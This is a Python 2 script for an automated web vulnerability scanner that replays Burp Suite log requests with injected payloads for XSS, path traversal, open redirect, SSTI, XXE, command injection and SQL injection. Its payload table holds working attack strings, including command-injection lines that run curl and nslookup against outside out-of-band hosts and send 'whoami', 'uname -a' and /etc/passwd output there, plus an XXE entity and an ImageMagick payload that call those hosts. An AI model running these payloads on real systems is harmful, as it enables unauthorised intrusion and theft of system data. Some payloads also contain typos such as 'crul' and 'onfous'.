#!/usr/bin/env python
#coding=utf-8

import threading
import random
import requests
import copy
import urlparse
import urllib
import re
import json
import base64
import copy
import time
import sys
import argparse
from AutoSqli import AutoSqli
import logging
from Queue import Queue
from colorama import *
from classSQL import *
from lib.common import *
from classSQLTimeInjection import SQLInjectionTime
# from classSQL import *

"""
根据网络上的一些脚本，自己改了一下
现在是多线程，对于burpsuite的日志提取出GET方法来，
过滤出一些`txt`, `jpg`等图片，js，css，无关的请求
然后使用 host+path+sorted(请求参数名) 这一个字符串作为去重的条件
得到的结果分别将xss的payload插入到对应的位置上去
再去请求
v1版本，不保证稳定性，只操作GET型的XSS， payload可以自己添加
"""

requests.packages.urllib3.disable_warnings()
# logging.getLogger('request')

_random=str(random.randint(300,182222))
# logging.basicConfig(level=logging.INFO,
#                     format='%(asctime)s ^^^: %(message)s')
# logging.getLogger("requests").setLevel(logging.WARNING)
lock = threading.Lock()
# insert_sql = "insert into vuln values "
# XSS规则
XSS_Rule = {
    "xss":[
        "\" onfous=alert(document.domain)\"><\"",
        "\"`'></textarea><audio/onloadstart=confirm`1` src>",
        "\"</script><svg onload=alert`1`>",
        # "\"`'></textarea><audio/onloadstart=confirm`1` src>",
    ],
    "lfi": [
        "../../../../../../../../../../etc/passwd",
        "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        "../../../../../../../../../../etc/passwd%00",
    ],
    # URL跳转与SSRF
    "redirect" : [
        'http://www.niufuren.cc/usr.txt', #  Valar Morghulis
        '@www.niufuren.cc/usr.txt', #  Valar Morghulis
    ],

    "cli" : [
        "$(nslookup {domain}.devil.yoyostay.top)",
        '&nslookup {domain}.devil.yoyostay.top&\'\\"`0&nslookup {domain}.devil.yoyostay.top&`\'',
        "nslookup {domain}.devil.yoyostay.top|nslookup {domain}.devil.yoyostay.top&nslookup {domain}.devil.yoyostay.top",
        # "'nslookup {domain}|nslookup {domain}&nslookup {domain}'",
        # '"nslookup {domain}|nslookup {domain}&nslookup {domain}"',
        ";nslookup {domain}.devil.yoyostay.top|nslookup {domain}.devil.yoyostay.top&nslookup {domain}.devil.yoyostay.top;",
        "$(curl http://`whoami`{domain}.wiwqng.ceye.io)",
        '&curl http://`whoami`{domain}.wiwqng.ceye.io/`uname -a`/&\'\\"`0&nslookup {domain}.wiwqng.ceye.io&`\'',
        "crul http://curl{domain}.wiwqng.ceye.io/`cat /etc/passwd`|nslookup {domain}.wiwqng.ceye.io&nslookup {domain}.wiwqng.ceye.io",
        ";crul http://{domain}.wiwqng.ceye.io/|crul http://{domain}.wiwqng.ceye.io/&crul http://{domain}.wiwqng.ceye.io/;",
    ],
    'ssti' : [
        '{{1357924680 * 2468013579}}',
        '${1357924680 * 2468013579}'
    ],
    'xxe' : [
        '<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://soapxxe_{domain}.devil.yoyostay.top/"> %dtd;]><xxx/>]]></foo></soap:Body>',
        '<?xml version="1.0" encoding="utf-8"?>\n\n<!DOCTYPE r [\n\n<!ENTITY r ANY>\n\n<!ENTITY sp SYSTEM "http://xxe_{domain}.devil.yoyostay.top/">\n\n]>\n\n<r>&sp;</r>'
    ]
}


XXE_Role = '<?xml version="1.0" encoding="utf-8"?>\n\n<!DOCTYPE r [\n\n<!ENTITY r ANY>\n\n<!ENTITY sp SYSTEM "http://xxe_{domain}.devil.yoyostay.top/">\n\n]>\n\n<r>&sp;</r>'

# imageMagick rules
ImageMagick_Rule = 'push graphic-context\nviewbox 0 0 640 480\nimage copy 200,200 100,100 "|curl http://imagemagick_{domain}.devil.yoyostay.top"\npop graphic-context'



# 文件包含规则


def getLinks(filename):
    # 得到url, headers->{"cookie", "Referer", "User-Agent"}
    result = {}
    no_repeat = set()
    DEBUG = True
    with open(filename, 'rb') as f:
        content=f.read()
    blocks = re.split("======================================================[\n|\r\n]", content)
    for index, block in enumerate(blocks):
        # if "search.video.iqiyi.com" not in block:
        #     continue
        block = re.split("[\n|\r\n]", block)

        # continue
        tmp = [i for i in block if i]
        if (len(tmp) < 4): continue
        if (not tmp[0].startswith('GET')) and (not tmp[0].startswith('POST')): continue
        try:
            p = tmp[0].split(" ")[1]
            if not checkType(p):
                continue
        except:
            continue

        path = ""
        host = ""
        headers = {"Cookie": "", "User-Agent": ""}
        method = ''

        method = tmp[0][:4].strip()
        if method == 'GET':
            path = tmp[0].split(" ")[1]
            for _ in tmp[1:]:
                if _.startswith('Host'):
                    # print _
                    host = _.split(":")[1].strip()
                else:
                    try:
                        xx = _.split(":")
                        headers[xx[0].strip()] = "".join(xx[1:]).strip()
                    except:
                        print _
                        break

        elif method == 'POST':
            path = tmp[0].split(" ")[1]
            for _ in tmp[1:-1]:
                if _.startswith('Host'):
                    host = _.split(":")[1].strip()
                else:
                    try:
                        xx = _.split(":")
                        headers[xx[0].strip()] = "".join(xx[1:]).strip()
                    except:
                        print _
                        break
        else:
            continue

        if path.startswith("http://"):
            url = path
        else:
            url = "http://" + host + path
        # print "URL={}".format(url)
        if not checkRepeat(url, method, no_repeat):
            result[index] = {}
            result[index]["url"] = url
            result[index]["headers"] = headers
            if tmp[0].startswith("POST"):
                result[index]["data"] = tmp[-1]
        else:
            continue
    print "The length: {0}".format(len(result))
    # for i in xrange(50):
    #     if i in result:
    #         print result[i]
    return result

def checkType(path):
    if path.split("?")[0].split(".")[-1] in (("f4v","bmp","bz2","css","doc","eot","flv","gif","gz","ico","jpeg","jpg","js","less","mp3", "mp4", "pdf","png","rar","rtf","swf","tar","tgz","txt","wav","woff","xml","zip")):
        return False
    else:
        return True

def checkRepeat(host, method, no_repeat=None):
    try:
        url_node = urlparse.urlparse(host)
        query_dict = urlparse.parse_qs(url_node.query)
        param = "".join(sorted(query_dict.keys()))
        host = url_node.netloc
        path = url_node.path
        # host + path + param 来判断是否存在
        tmp = method + host + path + param
        if tmp in no_repeat:
            return True
        else:
            no_repeat.add(tmp)
            return False
    except Exception as e:
        return True


def start_point(args):
    dict_links = getLinks(args.file)
    # sys.exit(0)
    redis_conn = RedisUtil(REDIS_DB, REDIS_HOST, REDIS_PASSWORD)
    HTTPQUEUE = Queue()
    for index in dict_links:
        url = dict_links[index]['url']
        headers = dict_links[index]['headers']
        ContentType = headers.get('Content-Type', '')
        if 'multipart/form-data' in ContentType:
            continue
        if 'text/plain' in ContentType:
            continue
        data = dict_links[index]['data'] if 'data' in dict_links[index] else None
        if data:
            method = 'POST'
        else:
            method = 'GET'
        HTTPQUEUE.put(THTTPJOB(url, method=method, data=data, headers=headers))

    outqueue = Queue()
    logging.info("[-] Totally {0} requests".format(HTTPQUEUE.qsize()))
    time.sleep(3)
    threads = []
    # 30个线程来跑
    for i in xrange(args.threads):
        thd = detectXSS(HTTPQUEUE, outqueue, args.delay)
        thd.setDaemon(True)
        threads.append(thd)

    for thd in threads:
        thd.start()

    time1 = time.time()
    while True:
        try:
            if threading.activeCount() <= 1:
                print "All Down"
                break

            if time.time() - time1 > args.limit * 60:
                print "Morn than 20 mins auto break"
                break
            logger.info("now threading.activeCount = {}".format(threading.activeCount()))
            time.sleep(5 * 60)
        except KeyboardInterrupt as e:
            print "User killed"
            break

    for index in dict_links.keys():
        item = dict_links[index]
        try:
            redis_conn.task_push(SQLI_TIME_QUEUE, json.dumps(item))
        except Exception as e:
            logger.error("redis_push errror for {}".format(repr(e)))
        # url = item['url']
        # headers = item['headers']
        # data = item['data'] if 'data' in item else None
        # try:
        #     time_result = SQLInjectionTime(url, headers=headers, data=data).startTest()
        #     if time_result:
        #         outqueue.put(('SQLInjection Time', 'awvs', url))
        # except KeyboardInterrupt:
        #     break
        # except Exception as e:
        #     continue


    start_time = time.time()
    for index in dict_links.keys():
        if time.time() - start_time > args.limit * 60:
            break
        try:
            item = dict_links[index]
            url = item['url']
            headers = item['headers']
            data = item['data'] if 'data' in item else None
            #time.sleep(3)
            aim_error_list = sqli_test(url, headers, data)
            for i in aim_error_list:
                print "[+] [{}]:\t".format(i[0]) + Fore.GREEN + "Found SQLi Error-Based Injection=> url:{} =>data:{}".format(i[1], i[2])  + Style.RESET_ALL
        except KeyboardInterrupt:
            break
        except Exception as e:
            logger.error("sql error test errror: {}".format(repr(e)))




    while not outqueue.empty():
        a = outqueue.get()
        logger.info("[++++++]" + Fore.GREEN + "[{}]\n        ".format(a[0]) + Fore.YELLOW + "[{}]\n        ".format(a[1]) + Fore.RED + a[2] + Style.RESET_ALL)






class detectXSS(threading.Thread):
    """docstring for detectXSS"""
    def __init__(self, inqueue, outqueue, delay):
        threading.Thread.__init__(self)
        self.inqueue =  inqueue
        self.outqueue = outqueue
        self.delay = delay

    def run(self):
        while True:
            if self.inqueue.empty():
                break
            hj = self.inqueue.get()
            isjson = False
            if hj.method == 'GET':
                query = hj.url.get_query
            else:
                if hj.headers.get('Content-Type', '').find('json') >= 0:
                    # print "with json, data is {}".format(hj.data)
                    query = urllib.urlencode(json.loads(hj.data))
                    isjson=True
                else:
                    query = hj.data
            # domain to replace
            domain = base64.b64encode(hj.url.url_string()).replace('=', '')
            for p in XSS_Rule:
                if p in ['cli', 'xxe']:
                    copy_rules = copy.copy(XSS_Rule[p])   # copy a rules to replace the {domain}
                    copy_rules = [pp.replace('{domain}', domain) for pp in copy_rules]
                else:
                    copy_rules = XSS_Rule[p]
                    # print "no cli,xxe rulse  {}".format(copy_rules)
                    # p.replace('{domain}', domain)
                if p == 'xxe':
                    # if payload type is xxe, we only need to chage the Content-Type to application/xml
                    # and method to POST
                    # then request
                    ContentType_status = hj.headers.get('Content-Type', '')
                    hj.headers['Content-Type'] = 'application/xml'
                    method_status = hj.method
                    hj.method = 'POST'
                    for rule in copy_rules:
                        hj.data = rule
                        hj.request()
                    hj.method = method_status
                    hj.headers['Content-Type'] = ContentType_status
                else:
                        # hj.data = XSS_Rule[p]
                    # print copy_rules
                    poll = Pollution(query, copy_rules, isjson=isjson).payload_generate()
                    # print poll
                    # poll is dict list
                    found = False
                    for payload in poll:
                        if found:
                            break
                        if hj.method == 'GET':
                            hj.url.get_dict_query = payload
                        else:
                            if isjson:
                                hj.data = json.dumps(payload)
                            else:
                                hj.data = urllib.urlencode(payload)
                        #print hj
                        time.sleep(self.delay)
                        logger.info("[test] [URL={}]".format(hj.url_string()))
                        status_code, headers, content, t = hj.request()
                        if p == 'xss':
                            for regex in XSS_Rule[p]:
                                # print hj.headers.get('Cookie')
                                # print status_code, headers.get('Content-Type', '')
                                if regex in content and status_code == 200 and headers.get('Content-Type', '').split(';')[0]  not in  ["application/json", "text/plain", "application/javascript", "text/json", "text/javascript", "application/x-javascript"]:
                                    # print "-------------------------------------"
                                    # with lock:
                                    #     a = MySQLUtils()

                                    self.outqueue.put(('XSS', payload, hj.response.request.url))
                                    found = True
                                    break
                        if p == 'lfi':
                            if "root:x:0" in content and status_code == 200:
                                self.outqueue.put(('LFI', payload, hj.response.request.url))
                                found = True
                                break
                        if p == 'redirect':
                            if 'Valar Morghulis' in content and status_code == 200:
                                self.outqueue.put(('Unsafe Redirect', payload, hj.response.request.url))
                                found = True
                                break

                        if p == 'ssti':
                            if '3351376549499229720' in content and status_code == 200:
                                self.outqueue.put(('SSTI', payload, hj.response.request.url))
                                found = True
                                break


            # FUZZ THE HTTP HEADERS
            hj.headers['Client-IP'] = '127.0.0.1'
            hj.headers['X-Forwarded-For'] = '127.0.0.1'
            hj.headers['Referer'] = 'http://www.baidu.com' if 'Referer' not in hj.headers else hj.headers['Referer']
            real_headers = hj.headers.copy()
            cli_payloads = copy.copy(XSS_Rule['cli'])
            cli_payloads = [p.replace('{domain}', domain) for p in cli_payloads]
            for payload in cli_payloads:
                hj.headers['User-Agent'] = real_headers['User-Agent'] + "UA" +  payload
                hj.headers['Client-IP'] = real_headers['Client-IP'] + "ClientIP" +payload
                hj.headers['X-Forwarded-For'] = real_headers['X-Forwarded-For'] +  "XFF" + payload
                hj.headers['Referer'] = real_headers['Referer'] + "Refer"+ payload
                hj.request()










def parse_arg():
    parser =  argparse.ArgumentParser()
    parser.add_argument("-t", "--threads", type=int, default=100, help="the threads num, default is 100")
    parser.add_argument("-d", "--delay", type=int, default=0, help="the delay of each request, default is 0")
    parser.add_argument("--limit", type=int, default=20, help="the default time to execute")
    parser.add_argument("file",  help="the burpsuite log file")
    args = parser.parse_args()
    return args




if __name__ == '__main__':
    Usage = "python %s target_log" %(sys.argv[0])

    try:
        args = parse_arg()
    except:
        print Usage
        exit(0)
    s_time = time.time()
    start_point(args)
    print "Used {}s In process".format((time.time() - s_time))



